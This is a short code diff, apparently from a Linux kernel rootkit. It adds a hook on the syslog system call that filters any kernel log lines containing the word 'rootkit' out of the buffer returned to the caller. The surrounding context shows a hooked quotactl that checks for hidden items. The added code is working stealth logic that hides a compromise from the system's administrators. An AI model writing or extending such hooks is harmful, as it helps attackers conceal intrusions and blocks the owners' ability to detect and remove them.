@@ -45,3 +45,24 @@ SYSCALL_HOOK_HANDLER4(quotactl, orig_quotactl, p_regs, unsigned int, ui32_cmd, c
 
     return do_check_hidden(orig_quotactl, p_regs, AT_FDCWD, s_special, 0);
 }
+
+// sys_syslog syscall hook handler
+SYSCALL_HOOK_HANDLER3(syslog, orig_syslog, p_regs, int, i32_type, char __user *, s_buf, int,
+                      i32_len)
+{
+    long i64_ret = 0;
+
+    pr_dev_info("syslog(%d, %p, %d)\n", i32_type, s_buf, i32_len);
+
+    if (s_buf == NULL) {
+        return orig_syslog(p_regs);
+    }
+
+    i64_ret = orig_syslog(p_regs);
+
+    if (i64_ret > 0) {
+        i64_ret = hide_lines(s_buf, i64_ret, "rootkit");
+    }
+
+    return i64_ret;
+}
